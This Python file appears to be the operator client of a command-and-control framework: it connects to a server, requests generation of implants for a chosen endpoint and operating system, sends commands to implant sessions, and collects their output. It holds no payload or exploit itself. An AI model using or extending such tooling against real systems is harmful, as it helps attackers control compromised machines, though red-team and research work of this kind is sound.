import socket
import threading
from pb import operatorpb_pb2

class Listener:
    def __init__(self, hostname, port, session_outputq, implantq):
        self.implantq = implantq
        self.session_outputq = session_outputq
        
        self._server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self._server.connect((hostname,port))

        threading.Thread(target=self._listen, args=(session_outputq, implantq)).start()

    def terminate(self):
        self.implantq.put(None)
        self.session_outputq.put(None)
        self._server.shutdown(socket.SHUT_RDWR)

    # convert message to protobuf and send to server
    def sendGenerate(self, endpoint, target_os):
        generate_cmd = operatorpb_pb2.Generate(endpoint=endpoint.encode("ascii"), target_os=target_os.encode("ascii"))
        message = operatorpb_pb2.Message(
            message_type=operatorpb_pb2.Message.MessageType.Generate, 
            data=generate_cmd.SerializeToString()
        )
        self._server.send(message.SerializeToString())

    def sendSession(self, message, session_id):
        session_cmd = operatorpb_pb2.SessionCmd(cmd=message.encode("ascii"),id=session_id)

        message = operatorpb_pb2.Message(
            message_type=operatorpb_pb2.Message.MessageType.SessionCmd, 
            data=session_cmd.SerializeToString()
        )

        self._server.send(message.SerializeToString())

    def _listen(self, session_outputq, implantq):
        while True:
            data = self._server.recv(1024)

            if data:
                message = operatorpb_pb2.Message()
                message.ParseFromString(data)

                if message.message_type == operatorpb_pb2.Message.MessageType.SessionInfo:
                    session_info = operatorpb_pb2.SessionInfo()
                    session_info.ParseFromString(message.data)
                    implantq.put(session_info)

                elif message.message_type == operatorpb_pb2.Message.MessageType.SessionCmdOutput:
                    session_output = operatorpb_pb2.SessionCmdOutput()
                    session_output.ParseFromString(message.data)
                    session_outputq.put((session_output.cmdOutput, session_output.id))

            else:
                break
